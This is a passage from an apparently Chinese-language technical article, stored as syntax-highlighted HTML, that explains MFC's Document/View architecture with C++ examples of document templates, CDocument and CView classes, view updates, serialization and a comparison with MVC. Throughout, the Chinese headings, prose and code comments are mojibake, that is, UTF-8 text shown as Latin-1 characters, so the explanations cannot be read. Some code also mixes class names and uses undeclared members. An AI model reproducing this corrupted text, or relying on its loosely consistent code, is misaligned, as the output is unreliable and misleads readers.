    <span class="hljs-comment">// 1. åˆ›å»ºæ–‡æ¡£æ¨¡æ¿ï¼ˆå…³é”®ç²˜åˆå‰‚ï¼‰</span>
    CSingleDocTemplate* pDocTemplate;
    pDocTemplate = <span class="hljs-keyword">new</span> <span class="hljs-built_in">CSingleDocTemplate</span>(
        IDR_MAINFRAME,          <span class="hljs-comment">// èµ„æºIDï¼ˆèœå•ã€å›¾æ ‡ç­‰ï¼‰</span>
        <span class="hljs-built_in">RUNTIME_CLASS</span>(CMyDoc),  <span class="hljs-comment">// æ–‡æ¡£ç±»</span>
        <span class="hljs-built_in">RUNTIME_CLASS</span>(CMainFrame), <span class="hljs-comment">// æ¡†æ¶ç±»</span>
        <span class="hljs-built_in">RUNTIME_CLASS</span>(CMyView)  <span class="hljs-comment">// è§†å›¾ç±»</span>
    );
    
    <span class="hljs-comment">// 2. æ³¨å†Œæ¨¡æ¿</span>
    <span class="hljs-built_in">AddDocTemplate</span>(pDocTemplate);
    
    <span class="hljs-comment">// 3. åˆ›å»ºæˆ–æ‰“å¼€æ–‡æ¡£</span>
    <span class="hljs-built_in">OnFileNew</span>(); <span class="hljs-comment">// åˆ›å»ºæ–°æ–‡æ¡£</span>
    
    <span class="hljs-keyword">return</span> TRUE;
}
</code></pre>
<h4 data-id="heading-18">2.1 CDocumentï¼šæ•°æ®çš„å®ˆæŠ¤è€…</h4>
<p>æ–‡æ¡£ç±»æ˜¯æ¶æ„ä¸­çš„â€œæ¨¡å‹â€éƒ¨åˆ†ï¼Œè´Ÿè´£æ‰€æœ‰ä¸æ•°æ®ç›¸å…³çš„æ“ä½œï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyDocument</span> : <span class="hljs-keyword">public</span> CDocument
{
<span class="hljs-keyword">protected</span>:
    <span class="hljs-built_in">CMyDocument</span>();
    
<span class="hljs-comment">// å±æ€§</span>
<span class="hljs-keyword">private</span>:
    CString m_strTitle;      <span class="hljs-comment">// æ–‡æ¡£æ ‡é¢˜</span>
    CStringArray m_lines;    <span class="hljs-comment">// æ–‡æœ¬è¡Œæ•°æ®</span>
    BOOL m_bModified;        <span class="hljs-comment">// ä¿®æ”¹æ ‡å¿—</span>
    
<span class="hljs-comment">// æ“ä½œ</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// æ•°æ®è®¿é—®æ¥å£</span>
    <span class="hljs-function"><span class="hljs-type">const</span> CString&amp; <span class="hljs-title">GetLine</span><span class="hljs-params">(<span class="hljs-type">int</span> nIndex)</span> <span class="hljs-type">const</span> </span>{ <span class="hljs-keyword">return</span> m_lines[nIndex]; }
    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetLineCount</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{ <span class="hljs-keyword">return</span> m_lines.<span class="hljs-built_in">GetSize</span>(); }
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddLine</span><span class="hljs-params">(<span class="hljs-type">const</span> CString&amp; strLine)</span></span>;
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DeleteLine</span><span class="hljs-params">(<span class="hljs-type">int</span> nIndex)</span></span>;
    
    <span class="hljs-comment">// é‡å†™åŸºç±»å…³é”®æ–¹æ³•</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">OnNewDocument</span><span class="hljs-params">()</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">OnOpenDocument</span><span class="hljs-params">(LPCTSTR lpszPathName)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">OnSaveDocument</span><span class="hljs-params">(LPCTSTR lpszPathName)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">DeleteContents</span><span class="hljs-params">()</span></span>;
    
    <span class="hljs-comment">// åºåˆ—åŒ– - æ ¸å¿ƒæ•°æ®æŒä¹…åŒ–æœºåˆ¶</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Serialize</span><span class="hljs-params">(CArchive&amp; ar)</span></span>;
    
    <span class="hljs-comment">// è§†å›¾é€šçŸ¥</span>
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">UpdateAllViews</span><span class="hljs-params">(CView* pSender, LPARAM lHint = <span class="hljs-number">0L</span>, CObject* pHint = <span class="hljs-literal">NULL</span>)</span></span>;
    
    <span class="hljs-built_in">DECLARE_DYNCREATE</span>(CMyDocument)
    <span class="hljs-built_in">DECLARE_MESSAGE_MAP</span>()
};
</code></pre>
<p><strong>æ–‡æ¡£çš„å…³é”®èŒè´£åŒ…æ‹¬ï¼š</strong></p>
<ol>
<li><strong>æ•°æ®å­˜å‚¨ä¸ç®¡ç†</strong>ï¼šç»´æŠ¤åº”ç”¨ç¨‹åºçš„æ ¸å¿ƒæ•°æ®ç»“æ„</li>
<li><strong>æŒä¹…åŒ–æ”¯æŒ</strong>ï¼šé€šè¿‡Serializeæ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™</li>
<li><strong>ä¿®æ”¹è¿½è¸ª</strong>ï¼šç®¡ç†â€œè„æ ‡å¿—â€ï¼ˆä¿®æ”¹çŠ¶æ€ï¼‰</li>
<li><strong>è§†å›¾åè°ƒ</strong>ï¼šé€šçŸ¥æ‰€æœ‰å…³è”è§†å›¾æ•°æ®å˜æ›´</li>
</ol>
<h4 data-id="heading-19">2.2 CViewï¼šæ•°æ®çš„è§‚å¯Ÿè€…ä¸äº¤äº’ç•Œé¢</h4>
<p>è§†å›¾ç±»æ˜¯æ¶æ„ä¸­çš„â€œè§†å›¾â€éƒ¨åˆ†ï¼Œè´Ÿè´£æ•°æ®çš„å¯è§†åŒ–å‘ˆç°å’Œç”¨æˆ·äº¤äº’ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CMyView</span> : <span class="hljs-keyword">public</span> CView
{
<span class="hljs-keyword">protected</span>:
    <span class="hljs-built_in">CMyView</span>();
    
<span class="hljs-comment">// å±æ€§</span>
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">int</span> m_nCurrentLine;      <span class="hljs-comment">// å½“å‰é€‰ä¸­è¡Œ</span>
    CFont m_fontText;        <span class="hljs-comment">// æ˜¾ç¤ºå­—ä½“</span>
    CSize m_sizeChar;        <span class="hljs-comment">// å­—ç¬¦å°ºå¯¸</span>
    
<span class="hljs-comment">// æ“ä½œ</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// è·å–å…³è”æ–‡æ¡£çš„å¼ºç±»å‹æŒ‡é’ˆ</span>
    <span class="hljs-function">CMyDocument* <span class="hljs-title">GetDocument</span><span class="hljs-params">()</span> <span class="hljs-type">const</span>
    </span>{
        <span class="hljs-keyword">return</span> (CMyDocument*)m_pDocument;
    }
    
    <span class="hljs-comment">// é‡å†™åŸºç±»å…³é”®æ–¹æ³•</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnDraw</span><span class="hljs-params">(CDC* pDC)</span></span>;           <span class="hljs-comment">// ç»˜åˆ¶å†…å®¹</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnUpdate</span><span class="hljs-params">(CView* pSender, LPARAM lHint, CObject* pHint)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnInitialUpdate</span><span class="hljs-params">()</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">PreCreateWindow</span><span class="hljs-params">(CREATESTRUCT&amp; cs)</span></span>;
    
    <span class="hljs-comment">// æ¶ˆæ¯å¤„ç†</span>
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnLButtonDown</span><span class="hljs-params">(UINT nFlags, CPoint point)</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnKeyDown</span><span class="hljs-params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnEditCut</span><span class="hljs-params">()</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnEditCopy</span><span class="hljs-params">()</span></span>;
    <span class="hljs-function">afx_msg <span class="hljs-type">void</span> <span class="hljs-title">OnEditPaste</span><span class="hljs-params">()</span></span>;
    
    <span class="hljs-built_in">DECLARE_DYNCREATE</span>(CMyView)
    <span class="hljs-built_in">DECLARE_MESSAGE_MAP</span>()
};
</code></pre>
<p>è§†å›¾é€šè¿‡<code>GetDocument()</code>æ–¹æ³•è·å–æ–‡æ¡£æŒ‡é’ˆï¼Œè¿™æ˜¯æ–‡æ¡£ä¸è§†å›¾é€šä¿¡çš„ä¸»è¦æ¡¥æ¢ã€‚è§†å›¾ä¸ç›´æ¥å­˜å‚¨æ•°æ®ï¼ŒåªæŒæœ‰å¯¹æ–‡æ¡£æ•°æ®çš„å¼•ç”¨ã€‚</p>
<h3 data-id="heading-20">ä¸‰ã€æ–‡æ¡£/è§†å›¾é€šä¿¡æœºåˆ¶</h3>
<h4 data-id="heading-21">3.1 æ•°æ®æµï¼šæ–‡æ¡£åˆ°è§†å›¾çš„æ›´æ–°</h4>
<p>æ–‡æ¡£æ•°æ®å˜åŒ–æ—¶ï¼Œé€šè¿‡<code>UpdateAllViews()</code>æ–¹æ³•é€šçŸ¥æ‰€æœ‰å…³è”çš„è§†å›¾ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ–‡æ¡£ç±»ä¸­ä¿®æ”¹æ•°æ®å¹¶é€šçŸ¥è§†å›¾</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyDocument::AddLine</span><span class="hljs-params">(<span class="hljs-type">const</span> CString&amp; strLine)</span>
</span>{
    m_lines.<span class="hljs-built_in">Add</span>(strLine);
    m_bModified = TRUE;
    
    <span class="hljs-comment">// é€šçŸ¥æ‰€æœ‰è§†å›¾æ•°æ®å·²æ›´æ–°</span>
    <span class="hljs-built_in">UpdateAllViews</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0L</span>, <span class="hljs-literal">NULL</span>);
    
    <span class="hljs-comment">// æˆ–è€…æºå¸¦æç¤ºä¿¡æ¯ï¼Œä¼˜åŒ–æ›´æ–°æ•ˆç‡</span>
    <span class="hljs-comment">// UpdateAllViews(NULL, UPDATE_LINE_ADDED, (CObject*)&amp;strLine);</span>
}
</code></pre>
<p>è§†å›¾æ¥æ”¶æ›´æ–°é€šçŸ¥å¹¶é‡ç»˜ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è§†å›¾ç±»ä¸­å“åº”æ›´æ–°é€šçŸ¥</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::OnUpdate</span><span class="hljs-params">(CView* pSender, LPARAM lHint, CObject* pHint)</span>
</span>{
    <span class="hljs-comment">// æ ¹æ®æç¤ºä¿¡æ¯å†³å®šæ›´æ–°ç­–ç•¥</span>
    <span class="hljs-keyword">if</span> (lHint == UPDATE_LINE_ADDED)
    {
        <span class="hljs-comment">// å±€éƒ¨æ›´æ–°ï¼šåªæ›´æ–°æ–°å¢è¡ŒåŒºåŸŸ</span>
        CString* pNewLine = (CString*)pHint;
        CRect rectUpdate = <span class="hljs-built_in">CalculateLineRect</span>(m_lines.<span class="hljs-built_in">GetSize</span>()<span class="hljs-number">-1</span>);
        <span class="hljs-built_in">InvalidateRect</span>(&amp;rectUpdate);
    }
    <span class="hljs-keyword">else</span>
    {
        <span class="hljs-comment">// å®Œå…¨æ›´æ–°ï¼šé‡ç»˜æ•´ä¸ªå®¢æˆ·åŒº</span>
        <span class="hljs-built_in">Invalidate</span>();
    }
}
</code></pre>
<h4 data-id="heading-22">3.2 äº¤äº’æµï¼šè§†å›¾åˆ°æ–‡æ¡£çš„ä¿®æ”¹</h4>
<p>ç”¨æˆ·é€šè¿‡è§†å›¾ç•Œé¢ä¿®æ”¹æ•°æ®æ—¶ï¼Œè§†å›¾è°ƒç”¨æ–‡æ¡£çš„æ¥å£ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// è§†å›¾å¤„ç†ç”¨æˆ·è¾“å…¥å¹¶ä¿®æ”¹æ–‡æ¡£</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::OnChar</span><span class="hljs-params">(UINT nChar, UINT nRepCnt, UINT nFlags)</span>
</span>{
    CMyDocument* pDoc = <span class="hljs-built_in">GetDocument</span>();
    
    <span class="hljs-keyword">if</span> (nChar == VK_RETURN)  <span class="hljs-comment">// å›è½¦é”®</span>
    {
        pDoc-&gt;<span class="hljs-built_in">AddLine</span>(m_strCurrentLine);  <span class="hljs-comment">// è°ƒç”¨æ–‡æ¡£æ–¹æ³•</span>
        m_strCurrentLine.<span class="hljs-built_in">Empty</span>();
    }
    <span class="hljs-keyword">else</span>
    {
        m_strCurrentLine += (TCHAR)nChar;
    }
    
    <span class="hljs-comment">// é‡ç»˜å½“å‰è¡Œ</span>
    CRect rectUpdate = <span class="hljs-built_in">CalculateCurrentLineRect</span>();
    <span class="hljs-built_in">InvalidateRect</span>(&amp;rectUpdate);
    
    CView::<span class="hljs-built_in">OnChar</span>(nChar, nRepCnt, nFlags);
}
</code></pre>
<h3 data-id="heading-23">å››ã€å¤šè§†å›¾æ”¯æŒï¼šä¸€æ¡£å¤šè§†çš„å®ç°</h3>
<p>æ–‡æ¡£/è§†å›¾æ¶æ„æœ€å¼ºå¤§çš„ç‰¹æ€§ä¹‹ä¸€æ˜¯æ”¯æŒå•ä¸ªæ–‡æ¡£å¯¹åº”å¤šä¸ªè§†å›¾ï¼Œè¿™åœ¨CADã€å›¾å½¢ç¼–è¾‘ç­‰åº”ç”¨ä¸­ç‰¹åˆ«æœ‰ç”¨ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// åˆ›å»ºåŒä¸€æ–‡æ¡£çš„ç¬¬äºŒä¸ªè§†å›¾</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMainFrame::OnWindowNewView</span><span class="hljs-params">()</span>
</span>{
    CMyDocument* pDoc = (CMyDocument*)<span class="hljs-built_in">GetActiveDocument</span>();
    
    <span class="hljs-comment">// åˆ›å»ºæ–°çš„æ¡†æ¶çª—å£</span>
    CChildFrame* pNewFrame = <span class="hljs-keyword">new</span> CChildFrame;
    
    <span class="hljs-comment">// åŠ¨æ€åˆ›å»ºæ–°è§†å›¾</span>
    CCreateContext context;
    context.m_pCurrentDoc = pDoc;
    context.m_pNewViewClass = <span class="hljs-built_in">RUNTIME_CLASS</span>(CMyView);
    
    <span class="hljs-comment">// åˆ›å»ºè§†å›¾å¹¶å…³è”åˆ°æ–°æ¡†æ¶</span>
    <span class="hljs-keyword">if</span> (!pNewFrame-&gt;<span class="hljs-built_in">LoadFrame</span>(IDR_MYTYPE, WS_OVERLAPPEDWINDOW, 
                              <span class="hljs-keyword">this</span>, &amp;context))
    {
        <span class="hljs-keyword">delete</span> pNewFrame;
        <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// æ˜¾ç¤ºæ–°çª—å£</span>
    pNewFrame-&gt;<span class="hljs-built_in">InitialUpdateFrame</span>(pDoc, TRUE);
}

<span class="hljs-comment">// ä¸åŒç±»å‹çš„è§†å›¾å¯ä»¥å±•ç¤ºåŒä¸€æ–‡æ¡£çš„ä¸åŒæ–¹é¢</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CGraphView</span> : <span class="hljs-keyword">public</span> CView  <span class="hljs-comment">// å›¾å½¢è§†å›¾</span>
{
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnDraw</span><span class="hljs-params">(CDC* pDC)</span>
    </span>{
        CMyDocument* pDoc = <span class="hljs-built_in">GetDocument</span>();
        <span class="hljs-comment">// å°†æ–‡æœ¬æ•°æ®è½¬æ¢ä¸ºå›¾å½¢å±•ç¤º</span>
        <span class="hljs-built_in">DrawTextAsGraph</span>(pDC, pDoc-&gt;<span class="hljs-built_in">GetAllLines</span>());
    }
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">CStatsView</span> : <span class="hljs-keyword">public</span> CView  <span class="hljs-comment">// ç»Ÿè®¡è§†å›¾</span>
{
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">OnDraw</span><span class="hljs-params">(CDC* pDC)</span>
    </span>{
        CMyDocument* pDoc = <span class="hljs-built_in">GetDocument</span>();
        <span class="hljs-comment">// æ˜¾ç¤ºæ–‡æœ¬çš„ç»Ÿè®¡ä¿¡æ¯</span>
        <span class="hljs-built_in">DrawStatistics</span>(pDC, pDoc-&gt;<span class="hljs-built_in">CalculateStats</span>());
    }
};
</code></pre>
<h3 data-id="heading-24">äº”ã€åºåˆ—åŒ–ï¼šæ–‡æ¡£æŒä¹…åŒ–çš„æ ¸å¿ƒæœºåˆ¶</h3>
<p>åºåˆ—åŒ–æ˜¯æ–‡æ¡£/è§†å›¾æ¶æ„çš„æ•°æ®æŒä¹…åŒ–åŸºç¡€ï¼Œå®ƒé€šè¿‡<code>CArchive</code>ç±»å®ç°æ•°æ®çš„äºŒè¿›åˆ¶æµå¼è¯»å†™ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ–‡æ¡£ç±»çš„åºåˆ—åŒ–å®ç°</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyDocument::Serialize</span><span class="hljs-params">(CArchive&amp; ar)</span>
</span>{
    <span class="hljs-keyword">if</span> (ar.<span class="hljs-built_in">IsStoring</span>())  <span class="hljs-comment">// ä¿å­˜æ–‡æ¡£</span>
    {
        <span class="hljs-comment">// å†™å…¥ç‰ˆæœ¬æ ‡è¯†</span>
        ar &lt;&lt; (WORD)<span class="hljs-number">0x0001</span>;  <span class="hljs-comment">// ç‰ˆæœ¬1.0</span>
        
        <span class="hljs-comment">// å†™å…¥æ–‡æ¡£å±æ€§</span>
        ar &lt;&lt; m_strTitle;
        ar &lt;&lt; m_bModified;
        
        <span class="hljs-comment">// å†™å…¥æ•°æ®å†…å®¹</span>
        m_lines.<span class="hljs-built_in">Serialize</span>(ar);  <span class="hljs-comment">// CStringArrayæ”¯æŒåºåˆ—åŒ–</span>
        
        <span class="hljs-comment">// å†™å…¥è‡ªå®šä¹‰å¯¹è±¡</span>
        <span class="hljs-keyword">if</span> (m_pCustomObj != <span class="hljs-literal">NULL</span>)
        {
            ar &lt;&lt; (WORD)<span class="hljs-number">1</span>;  <span class="hljs-comment">// æ ‡è®°æœ‰å¯¹è±¡</span>
            ar.<span class="hljs-built_in">WriteObject</span>(m_pCustomObj);  <span class="hljs-comment">// å†™å…¥å¯åºåˆ—åŒ–å¯¹è±¡</span>
        }
        <span class="hljs-keyword">else</span>
        {
            ar &lt;&lt; (WORD)<span class="hljs-number">0</span>;  <span class="hljs-comment">// æ ‡è®°æ— å¯¹è±¡</span>
        }
    }
    <span class="hljs-keyword">else</span>  <span class="hljs-comment">// åŠ è½½æ–‡æ¡£</span>
    {
        <span class="hljs-comment">// è¯»å–ç‰ˆæœ¬æ ‡è¯†</span>
        WORD wVersion;
        ar &gt;&gt; wVersion;
        
        <span class="hljs-keyword">if</span> (wVersion == <span class="hljs-number">0x0001</span>)
        {
            <span class="hljs-comment">// è¯»å–æ–‡æ¡£å±æ€§</span>
            ar &gt;&gt; m_strTitle;
            ar &gt;&gt; m_bModified;
            
            <span class="hljs-comment">// è¯»å–æ•°æ®å†…å®¹</span>
            m_lines.<span class="hljs-built_in">Serialize</span>(ar);
            
            <span class="hljs-comment">// è¯»å–è‡ªå®šä¹‰å¯¹è±¡</span>
            WORD wHasObject;
            ar &gt;&gt; wHasObject;
            <span class="hljs-keyword">if</span> (wHasObject == <span class="hljs-number">1</span>)
            {
                m_pCustomObj = (CCustomObject*)ar.<span class="hljs-built_in">ReadObject</span>(
                    <span class="hljs-built_in">RUNTIME_CLASS</span>(CCustomObject));
            }
        }
        <span class="hljs-keyword">else</span>
        {
            <span class="hljs-comment">// å¤„ç†æ—§ç‰ˆæœ¬æ ¼å¼</span>
            <span class="hljs-built_in">LoadOldFormat</span>(ar, wVersion);
        }
    }
}

<span class="hljs-comment">// è‡ªå®šä¹‰å¯åºåˆ—åŒ–å¯¹è±¡çš„å®ç°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CCustomObject</span> : <span class="hljs-keyword">public</span> CObject
{
    <span class="hljs-built_in">DECLARE_SERIAL</span>(CCustomObject)
    
<span class="hljs-keyword">private</span>:
    CString m_strData;
    <span class="hljs-type">int</span> m_nValue;
    CPointArray m_points;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">Serialize</span><span class="hljs-params">(CArchive&amp; ar)</span>
    </span>{
        CObject::<span class="hljs-built_in">Serialize</span>(ar);
        
        <span class="hljs-keyword">if</span> (ar.<span class="hljs-built_in">IsStoring</span>())
        {
            ar &lt;&lt; m_strData &lt;&lt; m_nValue;
            m_points.<span class="hljs-built_in">Serialize</span>(ar);
        }
        <span class="hljs-keyword">else</span>
        {
            ar &gt;&gt; m_strData &gt;&gt; m_nValue;
            m_points.<span class="hljs-built_in">Serialize</span>(ar);
        }
    }
    
    <span class="hljs-comment">// å¿…é¡»æœ‰æ— å‚æ„é€ å‡½æ•°</span>
    <span class="hljs-built_in">CCustomObject</span>() { }
};

<span class="hljs-built_in">IMPLEMENT_SERIAL</span>(CCustomObject, CObject, VERSIONABLE_SCHEMA | <span class="hljs-number">1</span>)
</code></pre>
<h3 data-id="heading-25">å…­ã€ä¸ç»å…¸MVCæ¶æ„çš„æ·±åº¦å¯¹æ¯”</h3>
<h4 data-id="heading-26">6.1 ç›¸ä¼¼æ€§ï¼šåˆ†ç¦»å…³æ³¨ç‚¹çš„å…±åŒè¿½æ±‚</h4>
<p>æ–‡æ¡£/è§†å›¾æ¶æ„ä¸MVCéƒ½éµå¾ªäº†æ•°æ®ä¸æ˜¾ç¤ºåˆ†ç¦»çš„åŸåˆ™ï¼š</p>





























<table><thead><tr><th>æ¦‚å¿µå¯¹åº”</th><th>MVCç»„ä»¶</th><th>æ–‡æ¡£/è§†å›¾ç»„ä»¶</th><th>èŒè´£ç›¸ä¼¼åº¦</th></tr></thead><tbody><tr><td>æ•°æ®å±‚</td><td>Model</td><td>Document</td><td>é«˜ï¼šéƒ½è´Ÿè´£æ•°æ®ç®¡ç†å’Œä¸šåŠ¡è§„åˆ™</td></tr><tr><td>æ˜¾ç¤ºå±‚</td><td>View</td><td>View</td><td>é«˜ï¼šéƒ½è´Ÿè´£æ•°æ®å¯è§†åŒ–</td></tr><tr><td>æ§åˆ¶å±‚</td><td>Controller</td><td>åˆ†æ•£å¤„ç†</td><td>ä½ï¼šMVCæœ‰ç‹¬ç«‹æ§åˆ¶å™¨</td></tr></tbody></table>
<h4 data-id="heading-27">6.2 å·®å¼‚æ€§ï¼šæ¶æ„å®Œæ•´æ€§çš„æœ¬è´¨åŒºåˆ«</h4>
<p>å…³é”®å·®å¼‚åœ¨äºæ§åˆ¶å±‚çš„å¤„ç†æ–¹å¼ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// MVCçš„æ˜ç¡®æ§åˆ¶æµ</span>
<span class="hljs-comment">// 1. ç”¨æˆ·è¾“å…¥ -&gt; Controller</span>
<span class="hljs-comment">// 2. Controlleræ›´æ–°Model</span>
<span class="hljs-comment">// 3. Modelé€šçŸ¥Viewæ›´æ–°</span>

<span class="hljs-comment">// æ–‡æ¡£/è§†å›¾çš„æ··åˆæ§åˆ¶æµ</span>
<span class="hljs-comment">// 1. ç”¨æˆ·è¾“å…¥ -&gt; Viewï¼ˆç›´æ¥å¤„ç†ï¼‰</span>
<span class="hljs-comment">// 2. Viewæ›´æ–°Documentï¼ˆç›´æ¥è°ƒç”¨ï¼‰</span>
<span class="hljs-comment">// 3. Documenté€šçŸ¥æ‰€æœ‰Viewæ›´æ–°</span>
</code></pre>
<p><strong>æ¶æ„å·®å¼‚çš„å…·ä½“è¡¨ç°ï¼š</strong></p>
<ol>
<li>
<p><strong>æ§åˆ¶å™¨è§’è‰²çš„ç¼ºå¤±</strong></p>
<ul>
<li>MVCï¼šControlleræ˜¯ç‹¬ç«‹çš„åè°ƒè€…ï¼Œå†³å®šå¦‚ä½•å“åº”è¾“å…¥</li>
<li>æ–‡æ¡£/è§†å›¾ï¼šæ§åˆ¶é€»è¾‘åˆ†æ•£åœ¨Viewå’ŒDocumentä¸­</li>
</ul>
</li>
<li>
<p><strong>é€šä¿¡æ¨¡å¼çš„ä¸åŒ</strong></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// MVCï¼šè§‚å¯Ÿè€…æ¨¡å¼ï¼Œæ¾è€¦åˆ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Model</span> {
    List&lt;Observer&gt; observers;
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">notifyObservers</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">for</span> (obs in observers) obs.<span class="hljs-built_in">update</span>();
    }
};

<span class="hljs-comment">// æ–‡æ¡£/è§†å›¾ï¼šç›´æ¥è°ƒç”¨ï¼Œç´§è€¦åˆ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Document</span> {
    List&lt;View*&gt; views;
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">UpdateAllViews</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">for</span> (view in views) view-&gt;<span class="hljs-built_in">OnUpdate</span>(<span class="hljs-keyword">this</span>);
    }
};
</code></pre>
</li>
<li>
<p><strong>å¯æµ‹è¯•æ€§çš„å½±å“</strong></p>
<ul>
<li>MVCï¼šModelå’ŒControllerå¯ç‹¬ç«‹äºViewè¿›è¡Œå•å…ƒæµ‹è¯•</li>
<li>æ–‡æ¡£/è§†å›¾ï¼šViewå’ŒDocumentç´§å¯†è€¦åˆï¼Œæµ‹è¯•å›°éš¾</li>
</ul>
</li>
</ol>
<h3 data-id="heading-28">ä¸ƒã€æ¶æ„çš„é€‚ç”¨åœºæ™¯ä¸å±€é™æ€§</h3>
<h4 data-id="heading-29">7.1 ç†æƒ³é€‚ç”¨åœºæ™¯</h4>
<p>æ–‡æ¡£/è§†å›¾æ¶æ„ç‰¹åˆ«é€‚åˆä»¥ä¸‹ç±»å‹çš„åº”ç”¨ï¼š</p>
<ol>
<li><strong>æ–‡æ¡£ä¸­å¿ƒå‹åº”ç”¨</strong>ï¼šæ–‡å­—å¤„ç†å™¨ã€ç”µå­è¡¨æ ¼ã€ä»£ç ç¼–è¾‘å™¨</li>
<li><strong>å¤šè§†å›¾æ•°æ®å±•ç¤º</strong>ï¼šCADç³»ç»Ÿã€æ•°æ®åˆ†æå·¥å…·ã€æ•°æ®åº“å‰ç«¯</li>
<li><strong>éœ€è¦å®Œæ•´æ–‡ä»¶æ”¯æŒçš„åº”ç”¨</strong>ï¼šæ”¯æŒæ‰“å¼€ã€ä¿å­˜ã€å¦å­˜ä¸ºç­‰æ ‡å‡†æ“ä½œ</li>
</ol>
<h4 data-id="heading-30">7.2 æ¶æ„å±€é™æ€§</h4>
<ol>
<li><strong>å­¦ä¹ æ›²çº¿é™¡å³­</strong>ï¼šéœ€è¦ç†è§£å¤§é‡MFCç‰¹å®šæ¦‚å¿µå’Œå®</li>
<li><strong>è¿‡åº¦è®¾è®¡ç®€å•åº”ç”¨</strong>ï¼šå¯¹äºå¯¹è¯æ¡†åº”ç”¨è¿‡äºå¤æ‚</li>
<li><strong>å¹³å°é”å®š</strong>ï¼šæ·±åº¦ç»‘å®šWindowså’ŒMFCæ¡†æ¶</li>
<li><strong>ç°ä»£æ€§ä¸è¶³</strong>ï¼šç¼ºä¹å¯¹è§¦æ‘¸ã€æ‰‹åŠ¿ç­‰ç°ä»£äº¤äº’çš„æ”¯æŒ</li>
</ol>
<h3 data-id="heading-31">å…«ã€å®é™…åº”ç”¨ç¤ºä¾‹ï¼šç®€æ˜“æ–‡æœ¬ç¼–è¾‘å™¨</h3>
<p>ä»¥ä¸‹æ˜¯æ–‡æ¡£/è§†å›¾æ¶æ„åœ¨æ–‡æœ¬ç¼–è¾‘å™¨ä¸­çš„å®Œæ•´å®ç°ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// æ–‡æ¡£ç±» - ç®¡ç†æ–‡æœ¬æ•°æ®</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CTextDocument</span> : <span class="hljs-keyword">public</span> CDocument
{
<span class="hljs-keyword">protected</span>:
    <span class="hljs-built_in">CTextDocument</span>();
    
    <span class="hljs-comment">// æ•°æ®å­˜å‚¨</span>
    CStringArray m_lines;
    <span class="hljs-type">int</span> m_nTotalChars;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// æ•°æ®æ“ä½œæ¥å£</span>
